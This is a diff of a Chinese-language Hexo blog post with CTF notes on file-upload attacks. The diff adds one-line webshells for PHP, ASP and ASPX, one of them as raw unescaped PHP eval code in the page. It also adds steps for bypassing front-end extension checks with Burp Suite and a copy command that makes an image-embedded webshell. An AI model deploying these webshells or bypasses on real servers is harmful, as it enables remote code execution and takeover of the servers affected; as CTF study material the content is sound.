@@ -8,12 +8,12 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>文件上传 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="文件上传极客大挑战 2019]Upload 1">
+  <meta name="description" content="文件上传php">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传">
 <meta property="og:url" content="http://example.com/2022/09/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="文件上传极客大挑战 2019]Upload 1">
+<meta property="og:description" content="文件上传php">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB2ed2d641041904edd83b7cad6e457315?method=download&shareKey=9790499bfc322a7950dab477c6159be2">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBb93f6e1d52d1bb4e602e83907775cc34?method=download&shareKey=b4f55f8a5e6f4712aea57246024b0074">
@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB5608a80ba799eb0e2f1ceb042699e5b1?method=download&shareKey=641800e52535ead792fe333b11a6778c">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBeeeafc1a6c881a6ab0c88c546132ed00?method=download&shareKey=29374683b1b3cea7d9ebb64f5d24eb26">
 <meta property="article:published_time" content="2022-09-08T13:14:34.000Z">
-<meta property="article:modified_time" content="2022-09-09T13:15:03.607Z">
+<meta property="article:modified_time" content="2022-09-17T13:13:17.856Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary">
@@ -179,9 +179,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="极客大挑战 2019]Upload 1"></a>极客大挑战 2019]Upload 1</h3><span id="more"></span>
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><?php echo @eval($_POST['shell']);?> <span id="more"></span>
 
-<ol>
+<h4 id="Asp"><a href="#Asp" class="headerlink" title="Asp"></a>Asp</h4><p>&lt;%execute(request(“value”))%&gt;</p>
+<h4 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h4><p>&lt;%@ Page Language&#x3D;“Jscript”%&gt;<br>&lt;%eval(Request.Item[“value”])%&gt;</p>
+<p>前端判断文件后缀名可以Burp Suite配置好Proxy -&gt; Options，并在Proxy-&gt;Intercept-&gt;Intercept is on，浏览器设置代理为Options中的配置，先把shell.php后缀改为jpg，然后提交，再filename中把文件shell.jpg后缀改为shell.php</p>
+<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>一般直接上传木马文件都会被过滤拦截，这时候就需要用到图片马。<br>所谓图片马，就是将一句话木马与图片相结合，使得图片中包含代码。<br>制作：<br>一个正常图片，一个木马文件，内容为php一句话木马，在命令框里<br>copy pic.jpg&#x2F;b + php木马.php&#x2F;a webshell.jpg生成图片马</p>
+<p>版权声明：本文为CSDN博主「维多利亚蜜汁鱼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CrotZZ/article/details/118491851">https://blog.csdn.net/CrotZZ/article/details/118491851</a></p>
+<h3 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="极客大挑战 2019]Upload 1"></a>极客大挑战 2019]Upload 1</h3><ol>
 <li><p>构造1.php文件，内容<?php eval($_POST[1]);?></p>
 </li>
 <li><p>报错，检查后发现网页源代码没有过滤代码，考虑抓包</p>
@@ -495,7 +500,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">sql</a>
+                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -503,11 +508,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
+                <a href="javascript:void(0)" class="js-tag color1">share</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">share</a>
+                <a href="javascript:void(0)" class="js-tag color4">sql</a>
               </li>
              
               <li class="article-tag-list-item">
